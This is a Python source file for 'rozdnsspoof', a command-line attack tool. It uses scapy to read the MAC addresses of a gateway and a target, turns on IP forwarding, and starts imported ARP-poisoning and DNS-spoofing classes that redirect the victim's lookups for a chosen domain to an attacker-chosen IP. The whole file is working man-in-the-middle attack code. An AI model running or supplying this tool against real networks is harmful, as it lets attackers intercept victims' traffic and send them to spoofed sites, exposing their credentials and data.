#!/usr/bin/env python3

import sys
import os
import argparse
from ARPSpoof import ARPSpoof
from DNSSpoof import DNSSPoof
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether

app_name = "rozdnsspoof"
app_version = "0.1"

def arg_parser() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--network", required=True, help="Specify the network device name to use")
    parser.add_argument("-g", "--gatewayIP", required=True, help="Specify the gateway IP address")
    parser.add_argument("-t", "--targetIP", required=True, help="Specify the target IP address")
    parser.add_argument("-d", "--domain", required=True, help="Specify the domain to spoof")
    parser.add_argument("-r", "--redirecttoIP", required=True, help="Specify the IP address to redirect to")
    return parser.parse_args()
            
def read_MAC(ip) -> str:    
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

def clean_forwarding():
    """Disable IP forwarding"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
        forward.write('0\n')

def start_forwarding():
    """Enable IP forwarding"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
        forward.write('1\n')

def main(args) -> int:
    arp_poisoning = None
    arp_thread = None
    dns_spoof = None
    dns_thread = None

    exit_code = 0

    try:
        print("[*] {} v{} started [CTRL-C to stop]".format(app_name, app_version))

        start_forwarding()

        gatewayMAC = read_MAC(args.gatewayIP)
        targetMAC = read_MAC(args.targetIP)

        print("[*] Gateway MAC: {}".format(gatewayMAC))
        print("[*] Target MAC: {}".format(targetMAC))

        if gatewayMAC is None or targetMAC is None:
            raise Exception("Unable to read MAC addresses")
        
        arp_poisoning = ARPSpoof(args.gatewayIP, gatewayMAC, args.targetIP, targetMAC)
        arp_thread = arp_poisoning.start()

        dns_spoof = DNSSPoof(args.network, args.targetIP, args.domain, args.redirecttoIP)
        dns_thread = dns_spoof.start()
        
        print("\n[!] {} finished .. shouldn't be here :/".format(app_name))

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL-C, stopping...")
        
    except Exception as e:
        print("[-] Exception: {}".format(e))
        exit_code = 1

    finally:
        if dns_spoof is not None:
            dns_spoof.stop()
        if arp_poisoning is not None:
            arp_poisoning.stop()

        if dns_thread is not None:
            dns_thread.join()
        if arp_thread is not None:
            arp_thread.join()

        if arp_poisoning is not None:
            arp_poisoning.restore_target()
        
        clean_forwarding()
        print("[*] {} stopped".format(app_name))

    return exit_code

if __name__ == "__main__":
    args = arg_parser()

    if os.geteuid() != 0:
        print("[-] Please run as root")
        sys.exit(1)

    sys.exit(main(args))
